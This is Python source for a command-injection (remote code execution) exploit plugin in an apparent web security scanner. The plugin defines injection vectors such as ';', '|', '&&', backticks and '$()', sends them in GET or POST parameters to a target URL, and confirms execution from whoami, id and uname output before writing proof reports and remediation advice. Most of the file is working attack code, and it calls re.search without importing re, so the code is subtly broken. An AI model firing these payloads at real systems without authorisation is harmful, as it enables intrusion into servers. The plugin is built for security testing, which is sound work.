"""
RCE (Remote Code Execution) Exploit Plugin

This plugin provides exploit capabilities for RCE vulnerabilities including:
- Command injection exploitation
- Reverse shell payloads
- File operations via command execution
- Information gathering
"""

import sys
import os
import time
from typing import Dict, List, Any, Optional
import logging
import base64

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_generator import get_payload_generator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logging.warning("Requests library not available")

logger = logging.getLogger(__name__)


class RCEPlugin(ExploitPlugin):
    """
    RCE exploit plugin.
    
    This plugin provides RCE exploitation capabilities including:
    - Command injection exploits
    - Information gathering via command execution
    - File reading via command execution
    - Detection of successful exploitation
    """
    
    # Constants
    MIN_COMMAND_OUTPUT_LENGTH = 5  # Minimum command output length for verification
    
    # Test commands that are safe but verify execution
    TEST_COMMANDS = {
        'linux': [
            'echo RCE_VERIFIED',
            'whoami',
            'id',
            'uname -a',
            'pwd',
        ],
        'windows': [
            'echo RCE_VERIFIED',
            'whoami',
            'hostname',
            'ver',
            'cd',
        ]
    }
    
    # Command injection prefixes/suffixes
    INJECTION_VECTORS = [
        '; {cmd}',
        '| {cmd}',
        '&& {cmd}',
        '& {cmd} &',
        '|| {cmd}',
        '` {cmd} `',
        '$({cmd})',
        '\n{cmd}\n',
    ]
    
    @property
    def vulnerability_type(self) -> str:
        """Return the vulnerability type identifier."""
        return 'rce'
    
    @property
    def name(self) -> str:
        """Return the plugin name."""
        return 'RCE Exploit'
    
    @property
    def description(self) -> str:
        """Return the plugin description."""
        return (
            'Remote Code Execution exploit plugin supporting command injection '
            'and basic exploitation techniques for RCE vulnerabilities.'
        )
    
    @property
    def version(self) -> str:
        """Return the plugin version."""
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate RCE payloads based on context.
        
        Args:
            context: Optional context containing:
                    - target_os: Target operating system (linux, windows)
                    - command: Specific command to execute
                    - injection_point: Where the injection occurs
        
        Returns:
            List of RCE payload strings
        """
        context = context or {}
        target_os = context.get('target_os', 'linux')
        command = context.get('command', 'echo RCE_VERIFIED')
        
        payloads = []
        
        # Generate payloads using different injection vectors
        for vector in self.INJECTION_VECTORS:
            payload = vector.format(cmd=command)
            payloads.append(payload)
        
        # Add URL-encoded versions
        import urllib.parse
        for payload in payloads.copy():
            payloads.append(urllib.parse.quote(payload))
        
        return payloads
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute RCE exploit attack.
        
        Args:
            target_url: The target URL to attack
            vulnerability_data: Dictionary containing vulnerability information:
                              - parameter: Vulnerable parameter name
                              - method: HTTP method (GET, POST, etc.)
            config: Optional configuration dictionary
        
        Returns:
            Dict containing:
                - success: Boolean indicating if attack succeeded
                - command_output: Output from command execution
                - evidence: Evidence of successful exploitation
                - successful_payloads: List of payloads that succeeded
                - repeater_requests: Request/response data for manual testing
                - error: Error message if attack failed
        """
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'rce',
            }
        
        config = config or {}
        parameter = vulnerability_data.get('parameter')
        method = vulnerability_data.get('method', 'GET').upper()
        
        if not parameter:
            return {
                'success': False,
                'error': 'No vulnerable parameter specified',
                'vulnerability_type': 'rce',
            }
        
        logger.info(f"Attempting RCE exploitation on {target_url}, parameter: {parameter}")
        
        # Try to determine OS and execute test commands
        exploitation_result = self._attempt_exploitation(
            target_url, parameter, method, config
        )
        
        if exploitation_result['success']:
            logger.info(f"Successfully exploited RCE on {target_url}")
            
            # Build the repeater request for the successful payload
            command = exploitation_result.get('command', '')
            vector = exploitation_result.get('vector', '')
            payload = vector.format(cmd=command) if vector else command
            
            repeater_req = self.format_repeater_request(
                url=target_url,
                method=method,
                headers={'User-Agent': 'Megido Scanner'},
                body=f"{parameter}={payload}" if method == 'POST' else '',
                description=f"RCE exploitation - Command: {command}"
            )
            
            # Add response data
            if 'output' in exploitation_result:
                repeater_req['response'] = {
                    'body': exploitation_result['output'],
                    'evidence': exploitation_result.get('evidence', '')
                }
            
            result = {
                'success': True,
                'command_output': exploitation_result.get('output', ''),
                'evidence': exploitation_result.get('evidence', ''),
                'os_detected': exploitation_result.get('os', 'unknown'),
                'vulnerability_type': 'rce',
                'message': 'Successfully executed remote commands',
                'successful_payloads': [payload],
                'repeater_requests': [repeater_req],
            }
            
            # Generate unified proof report
            if config.get('enable_proof_reporting', True):
                self._generate_proof_report(result, target_url, vulnerability_data, config, 
                                           exploitation_result, repeater_req)
            
            return result
        else:
            logger.info(f"RCE exploitation attempt failed on {target_url}")
            return {
                'success': False,
                'error': exploitation_result.get('error', 'Could not execute commands'),
                'message': 'RCE exploitation attempt was unsuccessful',
                'vulnerability_type': 'rce',
            }
    
    def _attempt_exploitation(self, url: str, parameter: str, method: str, 
                             config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt to exploit the RCE vulnerability.
        
        Returns:
            Dict with success status, output, and evidence
        """
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        
        # Try Linux commands first
        logger.info("Attempting Linux command execution...")
        linux_result = self._test_os_commands(
            url, parameter, method, 'linux', verify_ssl, timeout
        )
        
        if linux_result['success']:
            return linux_result
        
        # Try Windows commands
        logger.info("Attempting Windows command execution...")
        windows_result = self._test_os_commands(
            url, parameter, method, 'windows', verify_ssl, timeout
        )
        
        if windows_result['success']:
            return windows_result
        
        return {
            'success': False,
            'error': 'Could not execute commands on target system'
        }
    
    def _test_os_commands(self, url: str, parameter: str, method: str, 
                         os_type: str, verify_ssl: bool, timeout: int) -> Dict[str, Any]:
        """
        Test command execution for a specific OS type.
        
        Returns:
            Dict with success status and command output
        """
        commands = self.TEST_COMMANDS.get(os_type, self.TEST_COMMANDS['linux'])
        
        for command in commands:
            for vector in self.INJECTION_VECTORS[:5]:  # Test first 5 vectors
                payload = vector.format(cmd=command)
                
                try:
                    # Prepare request
                    if method == 'GET':
                        params = {parameter: payload}
                        response = requests.get(
                            url, params=params, timeout=timeout, verify=verify_ssl
                        )
                    else:  # POST
                        data = {parameter: payload}
                        response = requests.post(
                            url, data=data, timeout=timeout, verify=verify_ssl
                        )
                    
                    # Check for command output in response
                    response_text = response.text
                    
                    # Look for verification string
                    if 'RCE_VERIFIED' in response_text:
                        return {
                            'success': True,
                            'output': response_text[:500],  # First 500 chars
                            'evidence': f'Command executed: {command}, Vector: {vector}',
                            'os': os_type,
                            'command': command,
                            'vector': vector,
                        }
                    
                    # Look for command-specific output patterns
                    if command == 'whoami' and len(response_text) < 100:
                        # whoami typically returns short output
                        # Check for username pattern (alphanumeric, may contain - or _)
                        if (not any(x in response_text.lower() for x in ['error', 'exception', '<html']) and
                            re.search(r'[a-zA-Z0-9_-]+', response_text)):
                            return {
                                'success': True,
                                'output': response_text[:500],
                                'evidence': f'Command executed: {command}, Output: {response_text[:100]}',
                                'os': os_type,
                                'command': command,
                                'vector': vector,
                            }
                    
                    # Look for id command output (uid=, gid=)
                    if command == 'id' and ('uid=' in response_text or 'gid=' in response_text):
                        return {
                            'success': True,
                            'output': response_text[:500],
                            'evidence': f'Command executed: {command}, Found uid/gid in output',
                            'os': os_type,
                            'command': command,
                            'vector': vector,
                        }
                    
                    # Look for uname output
                    if command == 'uname -a' and any(x in response_text.lower() for x in ['linux', 'gnu', 'kernel']):
                        return {
                            'success': True,
                            'output': response_text[:500],
                            'evidence': f'Command executed: {command}, Found OS info in output',
                            'os': os_type,
                            'command': command,
                            'vector': vector,
                        }
                
                except requests.Timeout:
                    logger.debug(f"Timeout with payload: {payload}")
                except Exception as e:
                    logger.debug(f"Error testing payload {payload}: {e}")
        
        return {
            'success': False,
            'error': f'No successful command execution detected for {os_type}'
        }
    
    def verify(self, result: Dict[str, Any], 
               target_url: str,
               vulnerability_data: Dict[str, Any]) -> tuple:
        """
        Verify RCE exploitation with concrete proof of command execution.
        
        Only mark as verified if we have actual command output demonstrating
        code execution on the target system.
        
        Args:
            result: The result from execute_attack()
            target_url: The target URL
            vulnerability_data: Vulnerability data
            
        Returns:
            Tuple[bool, str]: (is_verified, proof_of_impact)
        """
        if not result.get('success'):
            return False, None
        
        command_output = result.get('command_output', '')
        evidence = result.get('evidence', '')
        os_detected = result.get('os_detected', 'unknown')
        
        # Must have command output to verify
        if not command_output or len(command_output) < self.MIN_COMMAND_OUTPUT_LENGTH:
            return False, None
        
        # Check for verification markers
        has_verification = False
        verification_markers = [
            'RCE_VERIFIED',
            'uid=',  # id command output
            'gid=',  # id command output
            'Linux',  # uname output
            'GNU',   # uname output
        ]
        
        for marker in verification_markers:
            if marker in command_output:
                has_verification = True
                break
        
        # Also check evidence for command execution confirmation
        if not has_verification and evidence:
            if 'Command executed:' in evidence:
                has_verification = True
        
        if has_verification:
            # Build proof of impact
            proof_lines = [
                "✓ VERIFIED - Remote Code Execution",
                "",
                f"Operating System: {os_detected}",
                ""
            ]
            
            if evidence:
                proof_lines.append(f"Exploitation Method: {evidence}")
                proof_lines.append("")
            
            proof_lines.append("Command Output:")
            proof_lines.append("─" * 60)
            
            # Sanitize and limit output for proof
            output_lines = command_output.strip().split('\n')[:20]  # Max 20 lines
            for line in output_lines:
                # Truncate long lines
                if len(line) > 100:
                    line = line[:97] + '...'
                proof_lines.append(f"  {line}")
            
            if len(command_output.split('\n')) > 20:
                proof_lines.append(f"  ... ({len(command_output.split('\n')) - 20} more lines)")
            
            proof_lines.append("─" * 60)
            proof_lines.append("")
            proof_lines.append("Impact: Arbitrary command execution on target system")
            
            proof = '\n'.join(proof_lines)
            return True, proof
        
        # Success claimed but no concrete proof
        return False, None
    
    def _generate_proof_report(self, result: Dict[str, Any], target_url: str,
                               vulnerability_data: Dict[str, Any], config: Dict[str, Any],
                               exploitation_result: Dict[str, Any], repeater_req: Dict[str, Any]) -> None:
        """
        Generate unified proof report using ProofReporter.
        
        Args:
            result: Exploitation result dictionary
            target_url: Target URL
            vulnerability_data: Vulnerability data
            config: Configuration dictionary
            exploitation_result: Raw exploitation result
            repeater_req: Repeater request data
        """
        try:
            from scanner.proof_reporter import get_proof_reporter
            
            # Initialize proof reporter (visual proof not applicable for RCE)
            reporter = get_proof_reporter(enable_visual_proof=False)
            
            # Create proof data container
            vuln_id = vulnerability_data.get('vulnerability_id')
            proof_data = reporter.create_proof_data('rce', vuln_id)
            
            # Set success status
            verified = result.get('success', False) and len(result.get('command_output', '')) > 0
            proof_data.set_success(
                success=result.get('success', False),
                verified=verified,
                confidence=0.95 if verified else 0.3
            )
            
            # Add HTTP request
            method = vulnerability_data.get('method', 'GET')
            proof_data.add_http_request(
                method=method,
                url=target_url,
                headers=repeater_req.get('headers', {}),
                body=repeater_req.get('body', '')
            )
            
            # Add HTTP response with command output
            if 'response' in repeater_req:
                resp = repeater_req['response']
                proof_data.add_http_response(
                    status_code=200,  # Assuming success
                    headers={},
                    body=resp.get('body', '')
                )
            
            # Add exploitation logs
            proof_data.add_log(f"RCE exploitation attempt on {target_url}", 'info')
            proof_data.add_log(f"OS detected: {exploitation_result.get('os', 'unknown')}", 'info')
            proof_data.add_log(f"Command executed: {exploitation_result.get('command', 'unknown')}", 'info')
            
            if result.get('evidence'):
                proof_data.add_log(result['evidence'], 'info')
            
            # Set command output
            if result.get('command_output'):
                proof_data.set_command_output(result['command_output'])
            
            # Add metadata
            proof_data.add_metadata('target_url', target_url)
            proof_data.add_metadata('parameter', vulnerability_data.get('parameter'))
            proof_data.add_metadata('os_detected', exploitation_result.get('os'))
            proof_data.add_metadata('command', exploitation_result.get('command'))
            proof_data.add_metadata('injection_vector', exploitation_result.get('vector'))
            proof_data.add_metadata('plugin_version', self.version)
            
            # Generate and save proof reports
            proof_results = reporter.report_proof(
                proof_data,
                save_json=config.get('save_proof_json', True),
                save_html=config.get('save_proof_html', True),
                store_db=config.get('store_proof_db', True),
                vulnerability_model=vulnerability_data.get('vulnerability_model')
            )
            
            # Add proof paths to result
            result['proof_json_path'] = proof_results.get('json_path')
            result['proof_html_path'] = proof_results.get('html_path')
            result['proof_db_stored'] = proof_results.get('db_stored')
            
            logger.info("RCE proof reporting completed successfully")
            
        except ImportError:
            logger.warning("ProofReporter not available, skipping proof generation")
        except Exception as e:
            logger.error(f"Error generating proof report: {e}", exc_info=True)
    
    def get_severity_level(self) -> str:
        """Return the typical severity level for RCE vulnerabilities."""
        return 'critical'
    
    def get_remediation_advice(self) -> str:
        """Return remediation advice for RCE vulnerabilities."""
        return (
            'Prevent RCE attacks:\n'
            '1. Never execute user input as code or system commands\n'
            '2. Use parameterized APIs instead of shell execution\n'
            '3. Implement strict input validation and sanitization\n'
            '4. Use safe deserialization libraries\n'
            '5. Avoid eval(), exec(), and similar dangerous functions\n'
            '6. Use sandboxing and containerization\n'
            '7. Apply principle of least privilege\n'
            '8. Keep all software components updated\n'
            '9. Use Content Security Policy (CSP) headers\n'
            '10. Implement Web Application Firewall (WAF) rules'
        )
